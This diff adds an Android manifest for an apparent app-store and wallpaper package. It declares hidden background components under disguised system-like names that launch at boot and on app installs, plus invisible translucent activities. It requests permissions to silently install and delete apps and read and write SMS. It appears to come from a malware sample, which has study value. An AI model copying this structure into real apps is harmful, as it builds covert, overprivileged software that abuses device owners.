@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:sharedUserId="android.cg.shared" package="com.cooguo.market">
+    <application android:icon="@drawable/appstore_launch" android:label="@string/appstore_label" android:name=".MarketApp">
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTask" android:name=".MarketActivity" android:screenOrientation="portrait" android:windowSoftInputMode="adjustPan">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="cooguo.intent.action.MARKET"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:name=".JumpToActivity">
+            <intent-filter>
+                <action android:name="android.service.wallpaper.LIVE_WALLPAPER_CHOOSER"/>
+                <action android:name="android.intent.action.SET_WALLPAPER"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:name=".LiveWallpaperPreview" android:theme="@style/Preview"/>
+        <activity android:name=".MarketStartingActivity"/>
+        <receiver android:name=".MarketReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.cooguo.wallpaper.service.WPSService">
+            <intent-filter>
+                <action android:name="cooguo.intent.action.WALLPAPER_SETTING"/>
+            </intent-filter>
+        </service>
+        <receiver android:name="com.android.apple.AppleReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.android.apple.AppleService">
+            <intent-filter>
+                <action android:name="com.android.apple.APPLESERVICE"/>
+            </intent-filter>
+        </service>
+        <activity android:name="com.android.apple.TestActivity"/>
+        <activity android:name="com.android.cgos.Activity1" android:theme="@android:style/Theme.Translucent"/>
+        <activity android:name="com.android.cgos.Activity2" android:theme="@android:style/Theme.Translucent"/>
+        <activity android:name="com.android.cgos.Activity3" android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="com.android.action_ACTIVITY3"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <service android:name="com.android.cgos.GosService"/>
+        <receiver android:name="com.android.cgos.AlarmReceiver"/>
+        <receiver android:name="com.android.cgos.GosReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.ACCESS_DOWNLOAD_MANAGER"/>
+    <uses-permission android:name="android.permission.SET_WALLPAPER_COMPONENT"/>
+    <uses-permission android:name="android.permission.BIND_WALLPAPER"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.CLEAR_APP_CACHE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.CLEAR_APP_USER_DATA"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+</manifest>
